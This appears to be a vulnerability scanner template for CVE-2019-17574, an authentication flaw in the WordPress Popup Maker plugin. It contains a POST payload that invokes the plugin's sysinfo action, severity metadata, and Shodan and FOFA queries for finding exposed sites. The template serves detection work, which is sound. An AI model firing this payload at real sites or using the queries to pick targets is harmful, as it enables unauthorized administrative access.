    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    popmake_action=popup_sysinfo&popmake-sysinfo=CVE-2019-17574

    '
id: CVE-2019-17574
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:code-atlantic:popup_maker:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2019-17574
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-639
    epss-percentile: 0.99413
    epss-score: 0.86894
  description: 'An issue was discovered in the Popup Maker plugin before 1.8.13 for
    WordPress. An unauthenticated attacker can partially control the arguments of
    the do_action function to invoke certain popmake_ or pum_ methods, as demonstrated
    by controlling content and delivery of popmake-system-info.txt (aka the "support
    debug text file").

    '
  impact: 'Unauthenticated attackers can gain administrative access to the WordPress
    site.

    '
  metadata:
    fofa-query: body=/wp-content/plugins/popup-maker/
    framework: wordpress
    max-request: 2
    product: popup_maker
    publicwww-query: /wp-content/plugins/popup-maker/
    shodan-query: http.html:/wp-content/plugins/popup-maker/
    vendor: code-atlantic
    verified: true
  name: Popup-Maker < 1.8.12 - Broken Authentication
  reference:
  - https://wpscan.com/vulnerability/9907
  - https://web.archive.org/web/20191128065954/https://blog.redyops.com/wordpress-plugin-popup-maker/
